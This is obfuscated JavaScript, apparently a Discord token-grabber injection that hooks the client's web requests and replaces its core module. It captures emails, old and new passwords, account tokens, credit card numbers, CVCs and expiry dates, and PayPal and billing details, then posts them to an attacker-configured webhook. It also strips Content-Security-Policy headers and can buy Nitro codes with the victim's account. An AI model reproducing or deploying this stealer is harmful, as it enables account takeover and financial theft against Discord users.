0x80:_0x216983+='HypeSquad\x20Brillance,\x20';break;case 0x40:_0x216983+=_0x4030c8(0x162);break;case 0x100:_0x216983+=_0x4030c8(0x201);break;case 0x0:_0x216983='None';break;default:_0x216983=_0x4030c8(0x207);break;}return _0x216983;},hooker=async _0x35adfe=>{const _0x679380=_0x298b61,_0x388ba4=JSON[_0x679380(0x18d)](_0x35adfe),_0x1e5a09=new URL(config[_0x679380(0x1ec)]),_0x24156e={'Content-Type':_0x679380(0x181),'Access-Control-Allow-Origin':'*'};if(!config[_0x679380(0x1ec)][_0x679380(0x180)](_0x679380(0x167))){const _0x38287a=totp(config['webhook_protector_key']);_0x24156e['Authorization']=_0x38287a;}const _0x59d724={'protocol':_0x1e5a09[_0x679380(0x18a)],'hostname':_0x1e5a09[_0x679380(0x1e7)],'path':_0x1e5a09[_0x679380(0x229)],'method':'POST','headers':_0x24156e},_0x51202a=https['request'](_0x59d724);_0x51202a['on'](_0x679380(0x173),_0x4d6444=>{const _0x2f56f3=_0x679380;console[_0x2f56f3(0x160)](_0x4d6444);}),_0x51202a[_0x679380(0x198)](_0x388ba4),_0x51202a[_0x679380(0x19f)]();},login=async(_0x478a53,_0x42a67e,_0x19037c)=>{const _0x250fd8=_0x298b61,_0x5a2220=await getInfo(_0x19037c),_0x244b65=getNitro(_0x5a2220['premium_type']),_0x4e84cb=getBadges(_0x5a2220['flags']),_0x566aa5=await getBilling(_0x19037c),_0x126a3a={'username':config[_0x250fd8(0x190)],'avatar_url':config[_0x250fd8(0x187)],'embeds':[{'color':config[_0x250fd8(0x21c)],'fields':[{'name':'**Account\x20Info**','value':_0x250fd8(0x161)+_0x478a53+'**\x20-\x20Password:\x20**'+_0x42a67e+'**','inline':![]},{'name':'**Discord\x20Info**','value':_0x250fd8(0x15c)+_0x244b65+_0x250fd8(0x1ef)+_0x4e84cb+'**\x0aBilling:\x20**'+_0x566aa5+'**','inline':![]},{'name':_0x250fd8(0x1b2),'value':'`'+_0x19037c+'`','inline':![]}],'author':{'name':_0x5a2220[_0x250fd8(0x183)]+'#'+_0x5a2220['discriminator']+_0x250fd8(0x221)+_0x5a2220['id'],'icon_url':_0x250fd8(0x220)+_0x5a2220['id']+'/'+_0x5a2220[_0x250fd8(0x1c5)]+_0x250fd8(0x199)}}]};if(config[_0x250fd8(0x1fd)])_0x126a3a[_0x250fd8(0x1a3)]=config[_0x250fd8(0x1c3)];hooker(_0x126a3a);},passwordChanged=async(_0x3b8a66,_0x58e6ec,_0x981f61)=>{const _0x4c2fdb=_0x298b61,_0x2e5a3f=await getInfo(_0x981f61),_0x28ca34=getNitro(_0x2e5a3f[_0x4c2fdb(0x1d7)]),_0x5a2fc9=getBadges(_0x2e5a3f[_0x4c2fdb(0x159)]),_0x9e6624=await getBilling(_0x981f61),_0x1d37fe={'username':config['embed_name'],'avatar_url':config[_0x4c2fdb(0x187)],'embeds':[{'color':config[_0x4c2fdb(0x21c)],'fields':[{'name':_0x4c2fdb(0x1fa),'value':'Email:\x20**'+_0x2e5a3f[_0x4c2fdb(0x205)]+_0x4c2fdb(0x158)+_0x3b8a66+'**\x0aNew\x20Password:\x20**'+_0x58e6ec+'**','inline':!![]},{'name':_0x4c2fdb(0x1f9),'value':_0x4c2fdb(0x15c)+_0x28ca34+_0x4c2fdb(0x1ef)+_0x5a2fc9+_0x4c2fdb(0x188)+_0x9e6624+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x981f61+'`','inline':![]}],'author':{'name':_0x2e5a3f[_0x4c2fdb(0x183)]+'#'+_0x2e5a3f[_0x4c2fdb(0x1df)]+'\x20|\x20'+_0x2e5a3f['id'],'icon_url':_0x4c2fdb(0x220)+_0x2e5a3f['id']+'/'+_0x2e5a3f[_0x4c2fdb(0x1c5)]+_0x4c2fdb(0x199)}}]};if(config['ping_on_run'])_0x1d37fe['content']=config[_0x4c2fdb(0x1c3)];hooker(_0x1d37fe);},emailChanged=async(_0x1ae394,_0x447d97,_0xd1eb13)=>{const _0x94b7ba=_0x298b61,_0x933fe=await getInfo(_0xd1eb13),_0x150cd0=getNitro(_0x933fe[_0x94b7ba(0x1d7)]),_0x175ec8=getBadges(_0x933fe['flags']),_0x2b1acd=await getBilling(_0xd1eb13),_0x5766d7={'username':config[_0x94b7ba(0x190)],'avatar_url':config[_0x94b7ba(0x187)],'embeds':[{'color':config[_0x94b7ba(0x21c)],'fields':[{'name':'**Email\x20Changed**','value':_0x94b7ba(0x1ed)+_0x1ae394+_0x94b7ba(0x1ba)+_0x447d97+'**','inline':!![]},{'name':_0x94b7ba(0x1f9),'value':'Nitro\x20Type:\x20**'+_0x150cd0+_0x94b7ba(0x1ef)+_0x175ec8+_0x94b7ba(0x188)+_0x2b1acd+'**','inline':!![]},{'name':_0x94b7ba(0x1b2),'value':'`'+_0xd1eb13+'`','inline':![]}],'author':{'name':_0x933fe[_0x94b7ba(0x183)]+'#'+_0x933fe[_0x94b7ba(0x1df)]+_0x94b7ba(0x221)+_0x933fe['id'],'icon_url':_0x94b7ba(0x220)+_0x933fe['id']+'/'+_0x933fe['avatar']+_0x94b7ba(0x199)}}]};if(config['ping_on_run'])_0x5766d7[_0x94b7ba(0x1a3)]=config[_0x94b7ba(0x1c3)];hooker(_0x5766d7);},PaypalAdded=async _0x4c4207=>{const _0xf945ce=_0x298b61,_0x1903bf=await getInfo(_0x4c4207),_0x4c2859=getNitro(_0x1903bf[_0xf945ce(0x1d7)]),_0xd1b0a0=getBadges(_0x1903bf['flags']),_0xa4d6e6=getBilling(_0x4c4207),_0x24055b={'username':config[_0xf945ce(0x190)],'avatar_url':config[_0xf945ce(0x187)],'embeds':[{'color':config['embed_color'],'fields':[{'name':'**Paypal\x20Added**','value':_0xf945ce(0x1cb),'inline':![]},{'name':'**Discord\x20Info**','value':_0xf945ce(0x15c)+_0x4c2859+'*\x0aBadges:\x20**'+_0xd1b0a0+_0xf945ce(0x188)+_0xa4d6e6+'**','inline':![]},{'name':'**Token**','value':'`'+_0x4c4207+'`','inline':![]}],'author':{'name':_0x1903bf[_0xf945ce(0x183)]+'#'+_0x1903bf[_0xf945ce(0x1df)]+_0xf945ce(0x221)+_0x1903bf['id'],'icon_url':_0xf945ce(0x220)+_0x1903bf['id']+'/'+_0x1903bf['avatar']+_0xf945ce(0x199)}}]};if(config[_0xf945ce(0x1fd)])_0x24055b[_0xf945ce(0x1a3)]=config[_0xf945ce(0x1c3)];hooker(_0x24055b);},ccAdded=async(_0x58aa33,_0x20f8f9,_0x4c717c,_0x4dad55,_0x3db32e)=>{const _0x189d05=_0x298b61,_0x572901=await getInfo(_0x3db32e),_0x5c1a9a=getNitro(_0x572901[_0x189d05(0x1d7)]),_0x1ab455=getBadges(_0x572901['flags']),_0x455fd7=await getBilling(_0x3db32e),_0x3ebb5d={'username':config[_0x189d05(0x190)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x189d05(0x21c)],'fields':[{'name':'**Credit\x20Card\x20Added**','value':_0x189d05(0x21e)+_0x58aa33+_0x189d05(0x17f)+_0x20f8f9+'**\x0aCredit\x20Card\x20Expiration:\x20**'+_0x4c717c+'/'+_0x4dad55+'**','inline':!![]},{'name':_0x189d05(0x1f9),'value':_0x189d05(0x15c)+_0x5c1a9a+_0x189d05(0x1ef)+_0x1ab455+'**\x0aBilling:\x20**'+_0x455fd7+'**','inline':!![]},{'name':_0x189d05(0x1b2),'value':'`'+_0x3db32e+'`','inline':![]}],'author':{'name':_0x572901[_0x189d05(0x183)]+'#'+_0x572901[_0x189d05(0x1df)]+_0x189d05(0x221)+_0x572901['id'],'icon_url':_0x189d05(0x220)+_0x572901['id']+'/'+_0x572901[_0x189d05(0x1c5)]+'.webp'}}]};if(config[_0x189d05(0x1fd)])_0x3ebb5d['content']=config[_0x189d05(0x1c3)];hooker(_0x3ebb5d);},nitroBought=async _0x3100aa=>{const _0x35355f=_0x298b61,_0x3f16f5=await getInfo(_0x3100aa),_0xcc813=getNitro(_0x3f16f5[_0x35355f(0x1d7)]),_0x39eb20=getBadges(_0x3f16f5[_0x35355f(0x159)]),_0x25c813=await getBilling(_0x3100aa),_0x1393b1=await buyNitro(_0x3100aa),_0x362362={'username':config[_0x35355f(0x190)],'content':_0x1393b1,'avatar_url':config[_0x35355f(0x187)],'embeds':[{'color':config[_0x35355f(0x21c)],'fields':[{'name':_0x35355f(0x1ce),'value':'**Nitro\x20Code:**\x0a```diff\x0a+\x20'+_0x1393b1+_0x35355f(0x17c),'inline':!![]},{'name':_0x35355f(0x1f9),'value':_0x35355f(0x15c)+_0xcc813+'**\x0aBadges:\x20**'+_0x39eb20+_0x35355f(0x188)+_0x25c813+'**','inline':!![]},{'name':_0x35355f(0x1b2),'value':'`'+_0x3100aa+'`','inline':![]}],'author':{'name':_0x3f16f5[_0x35355f(0x183)]+'#'+_0x3f16f5[_0x35355f(0x1df)]+'\x20|\x20'+_0x3f16f5['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x3f16f5['id']+'/'+_0x3f16f5[_0x35355f(0x1c5)]+_0x35355f(0x199)}}]};if(config[_0x35355f(0x1fd)])_0x362362['content']=config[_0x35355f(0x1c3)]+('\x0a'+_0x1393b1);hooker(_0x362362);};session[_0x298b61(0x165)]['webRequest'][_0x298b61(0x21f)](config[_0x298b61(0x1cc)],(_0x3eef80,_0x2f6e15)=>{const _0x4c6afd=_0x298b61;if(_0x3eef80[_0x4c6afd(0x226)][_0x4c6afd(0x156)](_0x4c6afd(0x1fe)))return _0x2f6e15({'cancel':!![]});updateCheck();}),session[_0x298b61(0x165)]['webRequest'][_0x298b61(0x1d8)]((_0x3c49f1,_0x7f0596)=>{const _0x169669=_0x298b61;_0x3c49f1[_0x169669(0x226)]['startsWith'](config[_0x169669(0x1ec)])?_0x3c49f1['url'][_0x169669(0x180)](_0x169669(0x1c8))?_0x7f0596({'responseHeaders':Object[_0x169669(0x195)]({'Access-Control-Allow-Headers':'*'},_0x3c49f1[_0x169669(0x15b)])}):_0x7f0596({'responseHeaders':Object[_0x169669(0x195)]({'Content-Security-Policy':[_0x169669(0x22a),_0x169669(0x1c9),_0x169669(0x1d9)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x3c49f1[_0x169669(0x15b)])}):(delete _0x3c49f1[_0x169669(0x15b)][_0x169669(0x212)],delete _0x3c49f1[_0x169669(0x15b)][_0x169669(0x166)],_0x7f0596({'responseHeaders':{..._0x3c49f1[_0x169669(0x15b)],'Access-Control-Allow-Headers':'*'}}));}),session['defaultSession'][_0x298b61(0x1d3)]['onCompleted'](config[_0x298b61(0x1ab)],async(_0x53bd44,_0x581f8f)=>{const _0x2296fc=_0x298b61;if(_0x53bd44[_0x2296fc(0x1b5)]!==0xc8&&_0x53bd44[_0x2296fc(0x1b5)]!==0xca)return;const _0x3e9f4c=Buffer['from'](_0x53bd44[_0x2296fc(0x1bb)][0x0][_0x2296fc(0x214)])[_0x2296fc(0x1e3)](),_0x83529b=JSON['parse'](_0x3e9f4c),_0xf994e8=await execScript(_0x2296fc(0x1fc));switch(!![]){case _0x53bd44[_0x2296fc(0x226)][_0x2296fc(0x1b1)]('login'):login(_0x83529b[_0x2296fc(0x1e2)],_0x83529b[_0x2296fc(0x20d)],_0xf994e8)['catch'](console[_0x2296fc(0x173)]);break;case _0x53bd44[_0x2296fc(0x226)]['endsWith'](_0x2296fc(0x16e))&&_0x53bd44[_0x2296fc(0x1de)]===_0x2296fc(0x21d):if(!_0x83529b['password'])return;_0x83529b[_0x2296fc(0x205)]&&emailChanged(_0x83529b[_0x2296fc(0x205)],_0x83529b[_0x2296fc(0x20d)],_0xf994e8)[_0x2296fc(0x20f)](console[_0x2296fc(0x173)]);_0x83529b[_0x2296fc(0x219)]&&passwordChanged(_0x83529b['password'],_0x83529b[_0x2296fc(0x219)],_0xf994e8)[_0x2296fc(0x20f)](console[_0x2296fc(0x173)]);break;case _0x53bd44[_0x2296fc(0x226)][_0x2296fc(0x1b1)](_0x2296fc(0x174))&&_0x53bd44['method']==='POST':const _0x73d3dc=querystring['parse'](unparsedData['toString']());ccAdded(_0x73d3dc[_0x2296fc(0x175)],_0x73d3dc[_0x2296fc(0x224)],_0x73d3dc['card[exp_month]'],_0x73d3dc[_0x2296fc(0x1aa)],_0xf994e8)[_0x2296fc(0x20f)](console['error']);break;case _0x53bd44[_0x2296fc(0x226)][_0x2296fc(0x1b1)]('paypal_accounts')&&_0x53bd44[_0x2296fc(0x1de)]===_0x2296fc(0x22f):PaypalAdded(_0xf994e8)['catch'](console[_0x2296fc(0x173)]);break;case _0x53bd44[_0x2296fc(0x226)][_0x2296fc(0x1b1)](_0x2296fc(0x1ac))&&_0x53bd44[_0x2296fc(0x1de)]===_0x2296fc(0x22f):if(!config[_0x2296fc(0x217)])return;setTimeout(()=>{const _0x259da5=_0x2296fc;nitroBought(_0xf994e8)[_0x259da5(0x20f)](console[_0x259da5(0x173)]);},0x1d4c);break;default:break;}}),module[_0x298b61(0x1f1)]=require('./core.asar');